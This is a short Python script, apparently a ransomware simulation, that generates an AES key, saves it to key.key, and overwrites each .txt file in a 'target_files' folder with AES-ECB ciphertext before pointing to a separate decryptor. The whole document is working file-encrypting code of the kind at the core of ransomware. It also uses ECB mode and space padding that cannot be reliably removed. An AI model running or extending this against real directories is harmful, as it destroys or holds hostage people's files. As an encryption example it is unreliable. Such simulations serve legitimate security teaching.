import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

def pad(data):
    return data + b' ' * (16 - len(data) % 16)

def encrypt_file(filepath, key):
    with open(filepath, 'rb') as f:
        data = f.read()

    cipher = AES.new(key, AES.MODE_ECB)
    encrypted_data = cipher.encrypt(pad(data))

    with open(filepath, 'wb') as f:
        f.write(encrypted_data)

def main():
    target_dir = "target_files"
    key = get_random_bytes(16)
    
    with open("key.key", "wb") as key_file:
        key_file.write(key)

    print("🔐 Encrypting files in folder:", target_dir)
    for filename in os.listdir(target_dir):
        if filename.endswith(".txt"):
            filepath = os.path.join(target_dir, filename)
            encrypt_file(filepath, key)
            print(f"  🔒 {filename} encrypted")

    print("\n✅ Simulation complete. Decrypt using `decryptor.py`.")

if __name__ == "__main__":
    main()
